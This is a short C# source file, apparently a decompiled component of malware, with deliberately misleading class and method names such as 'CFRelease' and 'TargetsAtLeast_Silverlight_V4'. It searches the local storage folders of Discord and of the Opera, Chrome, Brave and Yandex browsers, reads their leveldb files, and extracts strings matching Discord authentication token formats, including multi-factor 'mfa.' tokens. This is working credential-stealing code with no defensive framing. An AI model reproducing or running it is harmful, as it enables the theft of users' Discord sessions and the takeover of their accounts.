using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;

internal class CFRelease
{
	private static List<string> M_pdToken = new List<string>();

	private static void PublicExponent()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
		M_pdToken.Add(folderPath + "\\Discord");
		M_pdToken.Add(folderPath + "\\discordcanary");
		M_pdToken.Add(folderPath + "\\discordptb");
		M_pdToken.Add(folderPath + "\\\\Opera Software\\Opera Stable");
		M_pdToken.Add(folderPath2 + "\\Google\\Chrome\\User Data\\Default");
		M_pdToken.Add(folderPath2 + "\\BraveSoftware\\Brave-Browser\\User Data\\Default");
		M_pdToken.Add(folderPath2 + "\\Yandex\\YandexBrowser\\User Data\\Default");
	}

	public static List<string> TargetsAtLeast_Silverlight_V4()
	{
		PublicExponent();
		List<string> list = new List<string>();
		foreach (string item in M_pdToken)
		{
			if (!Directory.Exists(item))
			{
				continue;
			}
			string path = item + "\\Local Storage\\leveldb";
			DirectoryInfo directoryInfo = new DirectoryInfo(path);
			FileInfo[] files = directoryInfo.GetFiles("*.ldb");
			foreach (FileInfo fileInfo in files)
			{
				string input = fileInfo.OpenText().ReadToEnd();
				foreach (Match item2 in Regex.Matches(input, "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}"))
				{
					list.Add(item2.Value);
				}
				foreach (Match item3 in Regex.Matches(input, "mfa\\.[\\w-]{84}"))
				{
					list.Add(item3.Value);
				}
			}
		}
		return list;
	}
}
